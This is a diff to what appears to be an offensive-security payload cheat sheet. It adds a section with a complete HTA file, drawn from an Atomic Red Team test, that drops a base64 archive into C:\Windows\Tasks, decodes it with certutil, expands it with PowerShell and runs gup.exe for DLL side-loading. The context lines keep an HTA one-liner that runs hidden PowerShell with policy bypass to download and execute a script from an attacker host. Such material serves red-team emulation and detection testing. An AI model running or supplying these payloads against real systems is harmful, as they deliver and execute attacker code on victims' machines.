@@ -7,6 +7,7 @@
 - [.LNK (Link) Files](#lnk-link-file)
 - [.SCF (Shell Command File) File](#scf-shell-command-file-file)
 - [An HTML Application (HTA)](#an-html-application-hta)
+- [AtomicsDLLSide-Loading .hta File](#atomicsdllside-loading-hta-file)
 - [Background Reverse Shells](#background-reverse-shells)
 - [Bad PDF](#bad-pdf)
 - [Bash Reverse Shell](#bash-reverse-shell)
@@ -153,6 +154,56 @@ Command=ToggleDesktop
 
 ```c
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://<LHOST>/<FILE>.ps1')"</scRipt>
+```
+
+## AtomicsDLLSide-Loading .hta File
+
+> https://gist.github.com/MHaggis/90dece4492dc2d3875b846230b837d9b
+
+```c
+<html>
+<head>
+<title>Atomic Red Team - DLL Side-Loading HTA</title>
+<HTA:APPLICATION ID="AtomicSideLoad" APPLICATIONNAME="AtomicSideLoad" BORDER="thin" BORDERSTYLE="normal" ICON="shell32.dll,4" >
+<script language="VBScript">
+Dim shell
+Set shell = CreateObject("Wscript.Shell")
+
+' Base64 encoded content of invite.zip - which is https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/T1574.002.md#atomic-test-1---dll-side-loading-using-the-notepad-gupexe-binary">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/T1574.002.md#atomic-test-1---dll-side-loading-using-the-notepad-gupexe-binary
+Dim base64EncodedContent
+base64EncodedContent = "UEsDB<--- CUT FOR BREVITY --->UAAAA="
+
+' Path to write the encoded file and later, the decoded zip
+Dim filePath
+filePath = "C:\Windows\Tasks\invite.txt"
+
+' Write the base64 encoded content to a file
+Dim fso, textFile
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set textFile = fso.OpenTextFile(filePath, 2, True)
+textFile.Write base64EncodedContent
+textFile.Close
+
+' Decode the file from base64 to zip
+shell.Run "certutil -decode " & filePath & " " & Replace(filePath, ".txt", ".zip"), 0, True
+
+' Use PowerShell to unzip the file
+Dim unzipPath
+unzipPath = "C:\Windows\Tasks"
+shell.Run "powershell -command Expand-Archive -Path " & Replace(filePath, ".txt", ".zip") & " -DestinationPath " & unzipPath, 0, True
+
+MsgBox "Are You Ready?"
+' Run gup.exe
+shell.Run "C:\Windows\Tasks\gup.exe", 0, True
+
+MsgBox "DLL Side-Load Operation Completed."
+</script>
+</head>
+<body>
+<h2>Atomic Test HTA</h2>
+<img src="https://www.redcanary.com/wp-content/uploads/image2-25.png" alt="Atomic Red Team Logo" width="200" height="200">
+<p>This Atomic Red Team test is brought to you by: <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/T1574.002.md#atomic-test-1---dll-side-loading-using-the-notepad-gupexe-binary">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/T1574.002.md#atomic-test-1---dll-side-loading-using-the-notepad-gupexe-binary</a></p>
+</body>
 ```
 
 ## Background Reverse Shells
